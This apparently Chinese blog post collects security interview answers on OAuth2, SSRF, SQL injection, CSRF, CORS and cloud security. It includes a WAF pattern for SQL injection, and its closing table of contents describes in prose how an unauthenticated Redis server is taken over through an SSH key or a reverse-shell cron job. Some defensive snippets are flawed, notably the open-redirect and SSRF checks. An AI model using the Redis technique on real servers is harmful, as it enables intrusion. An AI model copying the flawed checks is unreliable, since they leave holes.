arr[right] = arr[right], arr[i]</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">quick_select</span>(<span class="params">arr, k</span>):</span><br><span class="line">    left, right = <span class="number">0</span>, <span class="built_in">len</span>(arr) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">        pivot_index = partition(arr, left, right)</span><br><span class="line">        <span class="keyword">if</span> pivot_index == k:</span><br><span class="line">            <span class="keyword">return</span> arr[pivot_index]</span><br><span class="line">        <span class="keyword">elif</span> pivot_index &lt; k:</span><br><span class="line">            left = pivot_index + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = pivot_index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numbers = [random.randint(<span class="number">0</span>, <span class="number">10</span>**<span class="number">9</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">8</span>)]</span><br><span class="line">median = quick_select(numbers, <span class="built_in">len</span>(numbers) // <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(median)</span><br></pre></td></tr></table></figure>

<p><strong>解法 2：最小堆（O(N log K)）</strong></p>
<ul>
<li>维护一个 <strong>大小为 N&#x2F;2+1 的最小堆</strong>，堆顶即为中位数。</li>
</ul>
<hr>
<h3 id="调试工具及异常排查流程？"><a href="#调试工具及异常排查流程？" class="headerlink" title="调试工具及异常排查流程？"></a><strong>调试工具及异常排查流程？</strong></h3><p><strong>常见调试工具</strong>：</p>
<ul>
<li>**<code>top</code> &#x2F; <code>htop</code>**（CPU、内存使用）</li>
<li>**<code>strace</code>**（系统调用跟踪）</li>
<li>**<code>gdb</code>**（C&#x2F;C++ 调试）</li>
<li>**<code>jstack</code>**（Java 线程堆栈）</li>
</ul>
<p><strong>异常排查流程</strong>：</p>
<ol>
<li><strong>日志分析</strong>（<code>tail -f logs/app.log</code>）</li>
<li><strong>检查资源占用</strong>（<code>top</code>、<code>ps aux</code>）</li>
<li><strong>网络连通性</strong>（<code>ping</code>、<code>telnet</code>）</li>
<li><strong>代码级 Debug（gdb、pdb）</strong></li>
</ol>
<hr>
<h3 id="数据库索引结构，什么情况下应该建唯一索引？"><a href="#数据库索引结构，什么情况下应该建唯一索引？" class="headerlink" title="数据库索引结构，什么情况下应该建唯一索引？"></a><strong>数据库索引结构，什么情况下应该建唯一索引？</strong></h3><table>
<thead>
<tr>
<th><strong>索引类型</strong></th>
<th><strong>适用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>唯一索引（Unique Index）</strong></td>
<td>防止重复数据，如 <code>用户名</code>、<code>邮箱</code></td>
</tr>
<tr>
<td><strong>普通索引（Index）</strong></td>
<td>加速查询，如 <code>WHERE status=1</code></td>
</tr>
<tr>
<td><strong>复合索引（Composite Index）</strong></td>
<td>多条件查询，如 <code>(user_id, order_date)</code></td>
</tr>
</tbody></table>
<p><strong>唯一索引示例</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX idx_email <span class="keyword">ON</span> users(email);</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="数据库分页语句如何写？"><a href="#数据库分页语句如何写？" class="headerlink" title="数据库分页语句如何写？"></a><strong>数据库分页语句如何写？</strong></h3><h2 id="MySQL-分页查询：优化方式：1-使用覆盖索引：-2-避免-OFFSET-扫描（适用于大数据量）："><a href="#MySQL-分页查询：优化方式：1-使用覆盖索引：-2-避免-OFFSET-扫描（适用于大数据量）：" class="headerlink" title="MySQL 分页查询：优化方式：1. 使用覆盖索引：   2. 避免 OFFSET 扫描（适用于大数据量）：   "></a><strong>MySQL 分页查询</strong>：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br><strong>优化方式</strong>：<br>1. <strong>使用覆盖索引</strong>：<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> id, name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> status<span class="operator">=</span><span class="number">1</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span> <span class="keyword">OFFSET</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure><br>2. <strong>避免 <code>OFFSET</code> 扫描</strong>（适用于大数据量）：<br>   <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">&gt;</span> <span class="number">1000</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">10</span>;</span><br></pre></td></tr></table></figure></h2><h3 id="HTTPS-交互过程"><a href="#HTTPS-交互过程" class="headerlink" title="HTTPS 交互过程"></a><strong>HTTPS 交互过程</strong></h3><ol>
<li><strong>客户端发起请求</strong>：<ul>
<li>浏览器访问 <code>https://example.com</code>，请求服务器的 <strong>TLS 证书</strong>。</li>
</ul>
</li>
<li><strong>服务器返回 SSL 证书</strong>：<ul>
<li>服务器提供 <strong>公钥证书（CA 签发）</strong>。</li>
</ul>
</li>
<li><strong>客户端验证证书</strong>：<ul>
<li>检查 <strong>是否被信任</strong>，证书是否 <strong>过期&#x2F;吊销</strong>。</li>
</ul>
</li>
<li><strong>密钥协商</strong>：<ul>
<li>使用 <strong>Diffie-Hellman &#x2F; RSA</strong> 生成对称密钥。</li>
</ul>
</li>
<li><strong>加密数据传输</strong>：<ul>
<li>客户端使用对称密钥进行加密通信。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="OAuth2-0-交互过程及不当安全风险"><a href="#OAuth2-0-交互过程及不当安全风险" class="headerlink" title="OAuth2.0 交互过程及不当安全风险"></a><strong>OAuth2.0 交互过程及不当安全风险</strong></h3><p><strong>OAuth2.0 授权流程</strong>：</p>
<ol>
<li>用户访问 <strong>Client（第三方应用）</strong> 并请求授权。</li>
<li>Client 跳转到 <strong>OAuth 服务器</strong> 获取授权码（<code>Authorization Code</code>）。</li>
<li>OAuth 服务器重定向回 Client 并携带授权码。</li>
<li>Client 用授权码换取 <strong>Access Token</strong>。</li>
<li>Client 使用 <code>Access Token</code> 访问受保护资源。</li>
</ol>
<p><strong>安全风险</strong>：</p>
<ul>
<li><strong>Token 泄露</strong>：<ul>
<li>解决方案：使用 <strong>短期 Token + Refresh Token</strong>。</li>
</ul>
</li>
<li><strong>重放攻击</strong>：<ul>
<li>解决方案：绑定 <code>PKCE（Code Verifier）</code>。</li>
</ul>
</li>
<li><strong>恶意 Client 滥用 Token</strong>：<ul>
<li>解决方案：严格验证 <code>redirect_uri</code>，只允许白名单域名。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="获取-URL-内容时的安全注意事项"><a href="#获取-URL-内容时的安全注意事项" class="headerlink" title="获取 URL 内容时的安全注意事项"></a><strong>获取 URL 内容时的安全注意事项</strong></h3><p><strong>防御措施</strong>：</p>
<ol>
<li><strong>防止 SSRF（服务器端请求伪造）</strong>：<ul>
<li>仅允许白名单 URL：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allowed_hosts = [<span class="string">&quot;https://trusted.com&quot;</span>]</span><br><span class="line"><span class="keyword">if</span> urlparse(user_input_url).netloc <span class="keyword">not</span> <span class="keyword">in</span> allowed_hosts:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法请求&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>防止 Open Redirect</strong>：<ul>
<li>禁止 <code>http://attacker.com</code> 伪装成 <code>example.com</code>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;://&quot;</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&quot;https://trusted.com&quot;</span>):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法 URL&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>超时控制</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(user_input_url, timeout=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="参数入库前如何过滤？"><a href="#参数入库前如何过滤？" class="headerlink" title="参数入库前如何过滤？"></a><strong>参数入库前如何过滤？</strong></h3><p><strong>预防 SQL 注入的措施</strong>：</p>
<ol>
<li><strong>使用参数化查询</strong>：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE id = %s&quot;</span>, (user_input,))</span><br></pre></td></tr></table></figure></li>
<li><strong>使用 ORM 框架</strong>：<ul>
<li>避免直接拼接 SQL，使用 <code>SQLAlchemy</code>、<code>Django ORM</code>。</li>
</ul>
</li>
<li><strong>正则校验</strong>：<ul>
<li>仅允许数字、字母：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&quot;^[a-zA-Z0-9]+$&quot;</span>, user_input):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法输入&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<hr>
<h3 id="过滤器和拦截器原理和应用场景？"><a href="#过滤器和拦截器原理和应用场景？" class="headerlink" title="过滤器和拦截器原理和应用场景？"></a><strong>过滤器和拦截器原理和应用场景？</strong></h3><table>
<thead>
<tr>
<th><strong>概念</strong></th>
<th><strong>作用</strong></th>
<th><strong>应用场景</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>过滤器（Filter）</strong></td>
<td>处理 <strong>请求&#x2F;响应</strong></td>
<td>认证、日志记录</td>
</tr>
<tr>
<td><strong>拦截器（Interceptor）</strong></td>
<td>控制 <strong>方法调用</strong></td>
<td>AOP（切面编程）、权限校验</td>
</tr>
</tbody></table>
<p><strong>示例：Spring 拦截器</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!request.getHeader(<span class="string">&quot;Authorization&quot;</span>).startsWith(<span class="string">&quot;Bearer&quot;</span>)) &#123;</span><br><span class="line">            response.setStatus(<span class="number">403</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="SESSION-和-Cookie-的区别"><a href="#SESSION-和-Cookie-的区别" class="headerlink" title="SESSION 和 Cookie 的区别"></a><strong>SESSION 和 Cookie 的区别</strong></h3><table>
<thead>
<tr>
<th><strong>特性</strong></th>
<th><strong>SESSION</strong></th>
<th><strong>Cookie</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>存储位置</strong></td>
<td>服务器</td>
<td>客户端</td>
</tr>
<tr>
<td><strong>生命周期</strong></td>
<td>会话结束</td>
<td>可设定过期时间</td>
</tr>
<tr>
<td><strong>安全性</strong></td>
<td>高，存储在服务器</td>
<td>易被窃取</td>
</tr>
</tbody></table>
<p><strong>使用场景</strong>：</p>
<ul>
<li><strong>SESSION</strong> 适用于 <strong>短期会话（如登录）</strong>。</li>
<li><strong>COOKIE</strong> 适用于 <strong>长期标识用户（如自动登录）</strong>。</li>
</ul>
<hr>
<h3 id="SESSION-ID-如何不被-JavaScript-读取？"><a href="#SESSION-ID-如何不被-JavaScript-读取？" class="headerlink" title="SESSION ID 如何不被 JavaScript 读取？"></a><strong>SESSION ID 如何不被 JavaScript 读取？</strong></h3><p><strong>防御方案</strong>：</p>
<ol>
<li><strong>设置 <code>HttpOnly</code></strong><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; HttpOnly</span><br></pre></td></tr></table></figure>
<ul>
<li>防止 JavaScript 通过 <code>document.cookie</code> 访问 <code>SESSION ID</code>。</li>
</ul>
</li>
<li><strong>使用 <code>SameSite=Strict</code></strong> 防御 CSRF：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=xyz123; SameSite=Strict</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="CSRF-Token-如何设计？"><a href="#CSRF-Token-如何设计？" class="headerlink" title="CSRF Token 如何设计？"></a><strong>CSRF Token 如何设计？</strong></h3><p><strong>CSRF 防御方案</strong>：</p>
<ol>
<li><strong>生成随机 Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line">csrf_token = secrets.token_hex(<span class="number">32</span>)</span><br></pre></td></tr></table></figure></li>
<li><strong>Token 绑定 Session</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[<span class="string">&quot;csrf_token&quot;</span>] = csrf_token</span><br></pre></td></tr></table></figure></li>
<li><strong>请求时校验 Token</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.form[<span class="string">&quot;csrf_token&quot;</span>] != session[<span class="string">&quot;csrf_token&quot;</span>]:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;CSRF 攻击&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<h3 id="同源策略？如何实现安全的跨域请求？"><a href="#同源策略？如何实现安全的跨域请求？" class="headerlink" title="同源策略？如何实现安全的跨域请求？"></a><strong>同源策略？如何实现安全的跨域请求？</strong></h3><p><strong>同源策略（Same-Origin Policy，SOP）</strong></p>
<ul>
<li><strong>浏览器安全机制</strong>，阻止不同域之间的 <code>JavaScript</code> 访问。</li>
</ul>
<p><strong>跨域解决方案</strong>：</p>
<ol>
<li><strong>CORS（跨域资源共享）</strong><ul>
<li>服务器允许特定域访问：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>https://trusted.com</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>JSONP（仅支持 GET 请求）</strong><ul>
<li>通过 <code>script</code> 标签跨域：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://api.example.com/data?callback=myFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>Nginx 代理</strong><ul>
<li>配置 <code>Nginx</code> 反向代理：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> /api/ &#123;</span><br><span class="line">    <span class="attribute">proxy_pass</span> https://backend.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<h2 id="安全架构方向"><a href="#安全架构方向" class="headerlink" title="安全架构方向"></a>安全架构方向</h2><h3 id="传统-IDC、云上、混合云架构的安全差异和挑战"><a href="#传统-IDC、云上、混合云架构的安全差异和挑战" class="headerlink" title="传统 IDC、云上、混合云架构的安全差异和挑战"></a><strong>传统 IDC、云上、混合云架构的安全差异和挑战</strong></h3><table>
<thead>
<tr>
<th><strong>架构</strong></th>
<th><strong>安全挑战</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>传统 IDC</strong></td>
<td>需要物理安全防护，硬件防火墙，网络隔离</td>
</tr>
<tr>
<td><strong>云上架构</strong></td>
<td>依赖 CSP（云服务提供商）安全策略，数据共享风险</td>
</tr>
<tr>
<td><strong>混合云</strong></td>
<td>需要 <strong>VPN &#x2F; Zero Trust</strong> 保障多云互通，防止数据泄露</td>
</tr>
</tbody></table>
<p><strong>挑战</strong>：</p>
<ul>
<li><strong>访问控制</strong>：如何限制云端数据访问？</li>
<li><strong>合规性</strong>：云端数据存储是否符合 <strong>GDPR、HIPAA</strong>？</li>
<li><strong>供应链安全</strong>：第三方 API、插件是否可信？</li>
</ul>
<hr>
<h3 id="云原生技术下的安全变化"><a href="#云原生技术下的安全变化" class="headerlink" title="云原生技术下的安全变化"></a><strong>云原生技术下的安全变化</strong></h3><p><strong>主要变化</strong>：</p>
<ol>
<li><strong>安全边界模糊</strong>：<ul>
<li>传统 <strong>防火墙</strong> 保护边界 -&gt; <strong>微服务</strong>、<strong>API</strong> 需要细粒度权限控制。</li>
</ul>
</li>
<li><strong>容器 &amp; Kubernetes 安全</strong>：<ul>
<li>容器逃逸、K8s API 访问控制：<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>DevSecOps</strong>：<ul>
<li>安全左移，代码级安全扫描（SAST、DAST、IAST）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="纯云业务如何设计安全架构？"><a href="#纯云业务如何设计安全架构？" class="headerlink" title="纯云业务如何设计安全架构？"></a><strong>纯云业务如何设计安全架构？</strong></h3><p><strong>云安全架构关键点</strong>：</p>
<ol>
<li><strong>IAM（身份访问管理）</strong>：<ul>
<li>避免 <code>root</code> 权限直接操作，使用 <strong>细粒度 RBAC</strong>。</li>
</ul>
</li>
<li><strong>数据加密</strong>：<ul>
<li><strong>存储加密（S3、RDS 加密）</strong></li>
<li><strong>传输加密（TLS 1.3 + mTLS）</strong></li>
</ul>
</li>
<li><strong>安全监控 &amp; 审计</strong>：<ul>
<li>使用 <strong>CloudTrail</strong>、<strong>SIEM</strong> 进行异常检测。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="SDL-中的关键点以及如何解决？"><a href="#SDL-中的关键点以及如何解决？" class="headerlink" title="SDL 中的关键点以及如何解决？"></a><strong>SDL 中的关键点以及如何解决？</strong></h3><p><strong>SDL（安全开发生命周期，Secure Development Lifecycle）关键点</strong>：</p>
<ol>
<li><strong>威胁建模（Threat Modeling）</strong>：<ul>
<li>识别业务关键点，如 <strong>身份认证、支付接口</strong>。</li>
</ul>
</li>
<li><strong>安全代码审计（SAST&#x2F;DAST）</strong>：<ul>
<li>使用 <strong>SonarQube、Checkmarx</strong> 检测漏洞。</li>
</ul>
</li>
<li><strong>漏洞管理 &amp; 修复</strong>：<ul>
<li>结合 <strong>DevSecOps</strong>，在 CI&#x2F;CD 进行 <strong>自动化漏洞扫描</strong>。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="漏洞发现在甲方和乙方的区别？"><a href="#漏洞发现在甲方和乙方的区别？" class="headerlink" title="漏洞发现在甲方和乙方的区别？"></a><strong>漏洞发现在甲方和乙方的区别？</strong></h3><table>
<thead>
<tr>
<th><strong>角色</strong></th>
<th><strong>关注点</strong></th>
<th><strong>安全策略</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>甲方（企业安全团队）</strong></td>
<td>业务风险、合规性</td>
<td><strong>WAF、DLP、SIEM</strong></td>
</tr>
<tr>
<td><strong>乙方（安全公司）</strong></td>
<td>技术漏洞、渗透测试</td>
<td><strong>红队演练、攻防对抗</strong></td>
</tr>
</tbody></table>
<hr>
<h3 id="如何防止-0day-攻击？"><a href="#如何防止-0day-攻击？" class="headerlink" title="如何防止 0day 攻击？"></a><strong>如何防止 0day 攻击？</strong></h3><ol>
<li><strong>启用应用白名单</strong>：<ul>
<li>限制运行未知程序：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> Restricted</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>漏洞管理 &amp; 补丁更新</strong>：<ul>
<li><strong>使用 WAF 过滤异常流量</strong>：<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">if</span> (<span class="variable">$query_string</span> <span class="regexp">~* &quot;union.*select&quot;)</span> &#123;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">403</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><strong>启用 RASP（运行时安全防护）</strong>：<ul>
<li>监控运行时攻击行为，拦截 RCE。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="不同企业不同阶段、不同体量的安全建设方法、区别及侧重"><a href="#不同企业不同阶段、不同体量的安全建设方法、区别及侧重" class="headerlink" title="不同企业不同阶段、不同体量的安全建设方法、区别及侧重"></a><strong>不同企业不同阶段、不同体量的安全建设方法、区别及侧重</strong></h3><table>
<thead>
<tr>
<th><strong>企业阶段</strong></th>
<th><strong>安全策略</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>初创企业</strong></td>
<td>基础安全（云安全配置、Web 防护）</td>
</tr>
<tr>
<td><strong>中型企业</strong></td>
<td>合规 &amp; 业务风控（数据加密、访问控制）</td>
</tr>
<tr>
<td><strong>大型企业</strong></td>
<td>高级威胁检测（EDR、SIEM、攻防演练）</td>
</tr>
</tbody></table>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B2%97%E4%BD%8D"><span class="toc-number">1.</span> <span class="toc-text">应用安全岗位</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5%E5%88%A9%E7%94%A8%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Redis 未授权访问漏洞如何入侵利用？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%EF%BC%9ARedis-%E9%BB%98%E8%AE%A4%E7%9B%91%E5%90%AC%E5%9C%A8-6379-%E7%AB%AF%E5%8F%A3%EF%BC%8C%E8%8B%A5%E6%9C%AA%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%E6%88%96%E7%BB%91%E5%AE%9A%E7%89%B9%E5%AE%9A-IP%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E3%80%82%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A-%E5%86%99%E5%85%A5-SSH-%E5%85%AC%E9%92%A5%EF%BC%9A%E5%88%A9%E7%94%A8-CONFIG-SET-%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%EF%BC%8C%E8%AE%BE%E7%BD%AE%E6%8C%81%E4%B9%85%E5%8C%96%E7%9B%AE%E5%BD%95%E4%B8%BA-root-ssh-%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-authorized-keys%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BD%BF%E7%94%A8-SET-%E5%91%BD%E4%BB%A4%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5%EF%BC%8C%E6%9C%80%E7%BB%88%E9%80%9A%E8%BF%87-SSH-%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82-%E5%8F%8D%E5%BC%B9-Shell%EF%BC%9A%E9%80%9A%E8%BF%87-CONFIG-SET-%E5%91%BD%E4%BB%A4%E4%BF%AE%E6%94%B9%E6%8C%81%E4%B9%85%E5%8C%96%E7%9B%AE%E5%BD%95%E4%B8%BA-var-spool-cron-%EF%BC%8C%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA-root%EF%BC%8C%E5%86%85%E5%AE%B9%E4%B8%BA%E5%8F%8D%E5%90%91-shell-%E5%91%BD%E4%BB%A4%EF%BC%8C%E4%BF%9D%E5%AD%98%E5%90%8E%E8%A7%A6%E5%8F%91%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E6%89%A7%E8%A1%8C%EF%BC%8C%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B-shell%E3%80%82%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A-%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E9%85%8D%E7%BD%AE-requirepass-%EF%BC%8C%E5%90%AF%E7%94%A8%E5%AF%86%E7%A0%81%E8%AE%A4%E8%AF%81%E3%80%82-%E7%BB%91%E5%AE%9A-IP%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E9%85%8D%E7%BD%AE-bind-127-0-0-1%EF%BC%8C%E9%99%90%E5%88%B6%E4%BB%85%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE%E3%80%82-%E9%98%B2%E7%81%AB%E5%A2%99%E9%99%90%E5%88%B6%EF%BC%9A%E4%BD%BF%E7%94%A8%E9%98%B2%E7%81%AB%E5%A2%99%E8%A7%84%E5%88%99%E9%99%90%E5%88%B6%E5%AF%B9-6379-%E7%AB%AF%E5%8F%A3%E7%9A%84%E8%AE%BF%E9%97%AE%EF%BC%8C%E4%BB%85%E5%85%81%E8%AE%B8%E5%8F%AF%E4%BF%A1-IP%E3%80%82-%E7%A6%81%E7%94%A8%E5%8D%B1%E9%99%A9%E5%91%BD%E4%BB%A4%EF%BC%9A%E5%9C%A8-redis-conf-%E4%B8%AD%E4%BD%BF%E7%94%A8-rename-command-%E7%A6%81%E7%94%A8%E6%88%96%E9%87%8D%E5%91%BD%E5%90%8D%E9%AB%98%E5%8D%B1%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%A6%82-CONFIG%E3%80%81FLUSHDB-%E7%AD%89%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">漏洞原理：Redis 默认监听在 6379 端口，若未设置密码或绑定特定 IP，攻击者可直接访问。利用方式：- 写入 SSH 公钥：利用 CONFIG SET 命令修改配置，设置持久化目录为 &#x2F;root&#x2F;.ssh&#x2F;，文件名为 authorized_keys，然后使用 SET 命令写入公钥，最终通过 SSH 登录目标服务器。- 反弹 Shell：通过 CONFIG SET 命令修改持久化目录为 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;，文件名为 root，内容为反向 shell 命令，保存后触发定时任务执行，获取远程 shell。修复方案：- 设置密码：在 redis.conf 中配置 requirepass &lt;password&gt;，启用密码认证。- 绑定 IP：在 redis.conf 中配置 bind 127.0.0.1，限制仅本地访问。- 防火墙限制：使用防火墙规则限制对 6379 端口的访问，仅允许可信 IP。- 禁用危险命令：在 redis.conf 中使用 rename-command 禁用或重命名高危命令，如 